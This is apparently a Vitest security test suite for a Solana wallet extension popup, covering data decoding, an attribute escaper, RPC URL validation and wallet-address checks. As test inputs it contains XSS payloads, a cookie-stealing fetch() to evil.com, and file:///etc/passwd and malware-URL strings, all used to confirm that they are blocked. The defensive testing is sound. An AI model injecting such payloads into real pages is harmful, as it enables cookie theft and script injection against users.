/**
 * Popup Data Injection & Decoding Security Tests
 *
 * Tests for:
 * - GuardConfig decoding with corrupted data
 * - IntentCommit decoding with malicious data
 * - Intent card HTML injection via decoded values
 * - Timestamp manipulation attacks
 * - escapeAttr (new XSS fix) validation
 * - RPC URL injection
 * - Wallet/appId input injection
 */
import { describe, it, expect } from 'vitest';

// ─── Decode functions from popup.js ─────────────────────────────────

function decodeGuardConfig(base64Data: string) {
  const data = Uint8Array.from(atob(base64Data), (c) => c.charCodeAt(0));
  const view = new DataView(data.buffer);
  const totalCommits = Number(view.getBigUint64(41, true));
  const totalVerifies = Number(view.getBigUint64(49, true));
  const isPaused = data[40] === 1;
  return { totalCommits, totalVerifies, isPaused };
}

function decodeIntentCommit(base64Data: string) {
  const data = Uint8Array.from(atob(base64Data), (c) => c.charCodeAt(0));
  const view = new DataView(data.buffer);
  const committedAt = Number(view.getBigInt64(104, true));
  const expiresAt = Number(view.getBigInt64(112, true));
  const hashBytes = data.slice(72, 104);
  const hashHex = Array.from(hashBytes)
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return { committedAt, expiresAt, hashHex };
}

function formatTimeRemaining(expiresAt: number) {
  const now = Math.floor(Date.now() / 1000);
  const diff = expiresAt - now;
  if (diff <= 0) return 'Expired';
  const min = Math.floor(diff / 60);
  const sec = diff % 60;
  return `${min}m ${sec}s remaining`;
}

// ─── escapeAttr from popup.js (new fix) ─────────────────────────────

function escapeAttr(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ═══════════════════════════════════════════════════════════════════

describe('SECURITY — GuardConfig Decoding with Corrupted Data', () => {
  it('all-zero data returns zeros and not paused', () => {
    const data = Buffer.alloc(66);
    const config = decodeGuardConfig(data.toString('base64'));
    expect(config.totalCommits).toBe(0);
    expect(config.totalVerifies).toBe(0);
    expect(config.isPaused).toBe(false);
  });

  it('isPaused byte = 1 is detected', () => {
    const data = Buffer.alloc(66);
    data[40] = 1; // is_paused = true
    const config = decodeGuardConfig(data.toString('base64'));
    expect(config.isPaused).toBe(true);
  });

  it('isPaused byte = 2 (invalid) treated as not paused', () => {
    const data = Buffer.alloc(66);
    data[40] = 2; // invalid — only 0 or 1 expected
    const config = decodeGuardConfig(data.toString('base64'));
    expect(config.isPaused).toBe(false); // data[40] === 1 is false
  });

  it('isPaused byte = 255 treated as not paused', () => {
    const data = Buffer.alloc(66);
    data[40] = 255;
    const config = decodeGuardConfig(data.toString('base64'));
    expect(config.isPaused).toBe(false);
  });

  it('max u64 counters do not crash', () => {
    const data = Buffer.alloc(66);
    const view = new DataView(data.buffer);
    view.setBigUint64(41, BigInt('18446744073709551615'), true); // u64::MAX
    view.setBigUint64(49, BigInt('18446744073709551615'), true);
    const config = decodeGuardConfig(data.toString('base64'));
    // Number() loses precision for u64::MAX but doesn't crash
    expect(config.totalCommits).toBeGreaterThan(0);
    expect(config.totalVerifies).toBeGreaterThan(0);
  });

  it('truncated data (too short) throws', () => {
    const data = Buffer.alloc(10); // way too short
    expect(() => decodeGuardConfig(data.toString('base64'))).toThrow();
  });

  it('minimum valid size (57 bytes) handles partial read', () => {
    const data = Buffer.alloc(57);
    // Only has up to total_verifies, not min_balance or bump
    const config = decodeGuardConfig(data.toString('base64'));
    expect(config.totalCommits).toBe(0);
    expect(config.totalVerifies).toBe(0);
  });
});

describe('SECURITY — IntentCommit Decoding with Malicious Data', () => {
  it('all-zero data returns zero timestamps and zero hash', () => {
    const data = Buffer.alloc(121);
    const commit = decodeIntentCommit(data.toString('base64'));
    expect(commit.committedAt).toBe(0);
    expect(commit.expiresAt).toBe(0);
    expect(commit.hashHex).toBe('00'.repeat(32));
  });

  it('negative timestamps are handled', () => {
    const data = Buffer.alloc(121);
    const view = new DataView(data.buffer);
    view.setBigInt64(104, BigInt(-1), true);
    view.setBigInt64(112, BigInt(-1000), true);
    const commit = decodeIntentCommit(data.toString('base64'));
    expect(commit.committedAt).toBe(-1);
    expect(commit.expiresAt).toBe(-1000);
  });

  it('far-future timestamp (year 3000) is handled', () => {
    const data = Buffer.alloc(121);
    const view = new DataView(data.buffer);
    const year3000 = BigInt(32503680000); // ~2999-12-31
    view.setBigInt64(104, year3000, true);
    view.setBigInt64(112, year3000 + BigInt(300), true);
    const commit = decodeIntentCommit(data.toString('base64'));
    expect(commit.expiresAt - commit.committedAt).toBe(300);
  });

  it('all-FF hash decodes correctly', () => {
    const data = Buffer.alloc(121);
    for (let i = 72; i < 104; i++) data[i] = 0xff;
    const commit = decodeIntentCommit(data.toString('base64'));
    expect(commit.hashHex).toBe('ff'.repeat(32));
  });

  it('truncated data (< 121 bytes) throws on field access', () => {
    const data = Buffer.alloc(50);
    expect(() => decodeIntentCommit(data.toString('base64'))).toThrow();
  });

  it('oversized data (> 121 bytes) still reads correct offsets', () => {
    const data = Buffer.alloc(500);
    const view = new DataView(data.buffer);
    view.setBigInt64(104, BigInt(1000), true);
    view.setBigInt64(112, BigInt(2000), true);
    data[72] = 0xab;
    const commit = decodeIntentCommit(data.toString('base64'));
    expect(commit.committedAt).toBe(1000);
    expect(commit.expiresAt).toBe(2000);
    expect(commit.hashHex.startsWith('ab')).toBe(true);
  });
});

describe('SECURITY — formatTimeRemaining Edge Cases', () => {
  it('exactly now returns Expired', () => {
    const now = Math.floor(Date.now() / 1000);
    expect(formatTimeRemaining(now)).toBe('Expired');
  });

  it('1 second ago returns Expired', () => {
    const now = Math.floor(Date.now() / 1000);
    expect(formatTimeRemaining(now - 1)).toBe('Expired');
  });

  it('1 second from now shows remaining', () => {
    const now = Math.floor(Date.now() / 1000);
    const result = formatTimeRemaining(now + 1);
    expect(result).toBe('0m 1s remaining');
  });

  it('60 seconds shows 1m 0s', () => {
    const now = Math.floor(Date.now() / 1000);
    const result = formatTimeRemaining(now + 60);
    expect(result).toBe('1m 0s remaining');
  });

  it('3600 seconds shows 60m 0s', () => {
    const now = Math.floor(Date.now() / 1000);
    const result = formatTimeRemaining(now + 3600);
    expect(result).toBe('60m 0s remaining');
  });

  it('negative expiresAt returns Expired', () => {
    expect(formatTimeRemaining(-1)).toBe('Expired');
  });

  it('zero expiresAt returns Expired', () => {
    expect(formatTimeRemaining(0)).toBe('Expired');
  });

  it('very far future does not crash', () => {
    const result = formatTimeRemaining(Number.MAX_SAFE_INTEGER);
    expect(result).toContain('remaining');
  });
});

describe('SECURITY — escapeAttr XSS Prevention (New Fix)', () => {
  it('escapes double quotes', () => {
    expect(escapeAttr('" onload="alert(1)"')).toBe('&quot; onload=&quot;alert(1)&quot;');
  });

  it('escapes HTML tags', () => {
    expect(escapeAttr('<img src=x>')).toBe('&lt;img src=x&gt;');
  });

  it('escapes ampersands', () => {
    expect(escapeAttr('a&b')).toBe('a&amp;b');
  });

  it('safe origin passes through', () => {
    expect(escapeAttr('https://jup.ag')).toBe('https://jup.ag');
  });

  it('javascript: URI is escaped', () => {
    expect(escapeAttr('javascript:alert(1)')).toBe('javascript:alert(1)');
    // No <, >, ", & so passes through — but data-origin attribute is quoted
  });

  it('combined XSS payload is neutralized', () => {
    const payload = '"><script>alert(document.cookie)</script><div class="';
    const escaped = escapeAttr(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('">');
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&lt;');
  });

  it('event handler injection is neutralized', () => {
    const payload = '" onclick="fetch(\'https://evil.com?c=\'+document.cookie)" x="';
    const escaped = escapeAttr(payload);
    expect(escaped).not.toContain('" onclick');
  });

  it('SVG XSS payload is neutralized', () => {
    const payload = '<svg onload=alert(1)>';
    const escaped = escapeAttr(payload);
    expect(escaped).not.toContain('<svg');
  });

  it('nested HTML entity bypass attempt', () => {
    const payload = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const escaped = escapeAttr(payload);
    // Double-escaping: &amp;lt; — safe
    expect(escaped).toContain('&amp;lt;');
  });

  it('empty string returns empty', () => {
    expect(escapeAttr('')).toBe('');
  });

  it('very long string does not crash', () => {
    const long = '"<>'.repeat(100000);
    const escaped = escapeAttr(long);
    expect(escaped.length).toBeGreaterThan(long.length); // escaping expands
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
  });
});

describe('SECURITY — Intent Card HTML Rendering', () => {
  // Simulate what popup.js does with decoded data
  function renderIntentCard(intent: { hashHex: string; expiresAt: number; committedAt: number }, pubkey: string): string {
    const now = Math.floor(Date.now() / 1000);
    const isActive = intent.expiresAt > now;
    return `
      <div class="intent-card">
        <span class="intent-status ${isActive ? 'status-active' : 'status-expired'}">
          ${isActive ? 'Active' : 'Expired'}
        </span>
        <span class="intent-value">${escapeAttr(intent.hashHex.slice(0, 16))}...</span>
        <span class="intent-value">${escapeAttr(new Date(intent.committedAt * 1000).toLocaleTimeString())}</span>
        <span class="intent-value">${escapeAttr(formatTimeRemaining(intent.expiresAt))}</span>
        <span class="intent-value">${escapeAttr(pubkey.slice(0, 12))}...</span>
      </div>
    `;
  }

  it('normal intent renders safely', () => {
    const now = Math.floor(Date.now() / 1000);
    const html = renderIntentCard(
      { hashHex: 'ab'.repeat(32), expiresAt: now + 300, committedAt: now },
      '4etWfDJNHhjYdv7fuGe236GDPguwUXVk9WhbEpQsPix7',
    );
    expect(html).toContain('Active');
    expect(html).toContain('abababababababab...');
    expect(html).toContain('4etWfDJNHhjY...');
  });

  it('malicious pubkey with HTML is escaped', () => {
    const html = renderIntentCard(
      { hashHex: '00'.repeat(32), expiresAt: 0, committedAt: 0 },
      '<img src=x onerror=alert(1)>longkey',
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
  });

  it('expired intent shows Expired status', () => {
    const html = renderIntentCard(
      { hashHex: 'ff'.repeat(32), expiresAt: 1000, committedAt: 900 },
      'validkey1234567890',
    );
    expect(html).toContain('Expired');
    expect(html).toContain('status-expired');
  });
});

describe('SECURITY — RPC URL Configuration Injection', () => {
  function validateRpcUrl(url: string): boolean {
    try {
      const parsed = new URL(url);
      return parsed.protocol === 'https:' || parsed.protocol === 'http:';
    } catch {
      return false;
    }
  }

  it('valid HTTPS URL passes', () => {
    expect(validateRpcUrl('https://api.mainnet-beta.solana.com')).toBe(true);
  });

  it('valid HTTP URL passes (localhost dev)', () => {
    expect(validateRpcUrl('http://localhost:8899')).toBe(true);
  });

  it('javascript: URI is rejected', () => {
    expect(validateRpcUrl('javascript:alert(1)')).toBe(false);
  });

  it('data: URI is rejected', () => {
    expect(validateRpcUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
  });

  it('file: URI is rejected', () => {
    expect(validateRpcUrl('file:///etc/passwd')).toBe(false);
  });

  it('empty string is rejected', () => {
    expect(validateRpcUrl('')).toBe(false);
  });

  it('FTP URI is rejected', () => {
    expect(validateRpcUrl('ftp://evil.com/malware')).toBe(false);
  });

  it('ws/wss URI is rejected (not HTTP)', () => {
    expect(validateRpcUrl('ws://evil.com')).toBe(false);
    expect(validateRpcUrl('wss://evil.com')).toBe(false);
  });
});

describe('SECURITY — Wallet Input Sanitization', () => {
  const BASE58_REGEX = /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{32,44}$/;

  it('valid 44-char Solana address passes', () => {
    expect(BASE58_REGEX.test('4etWfDJNHhjYdv7fuGe236GDPguwUXVk9WhbEpQsPix7')).toBe(true);
  });

  it('valid 32-char address passes', () => {
    const short = '11111111111111111111111111111111'; // 32 chars
    expect(BASE58_REGEX.test(short)).toBe(true);
  });

  it('too short (31 chars) fails', () => {
    expect(BASE58_REGEX.test('1111111111111111111111111111111')).toBe(false);
  });

  it('too long (45 chars) fails', () => {
    expect(BASE58_REGEX.test('a'.repeat(45))).toBe(false);
  });

  it('HTML injection fails', () => {
    expect(BASE58_REGEX.test('<script>alert(1)</script>')).toBe(false);
  });

  it('URL injection fails', () => {
    expect(BASE58_REGEX.test('https://evil.com/steal?wallet=')).toBe(false);
  });

  it('newline injection fails', () => {
    expect(BASE58_REGEX.test('valid\nbase58key')).toBe(false);
  });

  it('tab injection fails', () => {
    expect(BASE58_REGEX.test('valid\tbase58key')).toBe(false);
  });
});
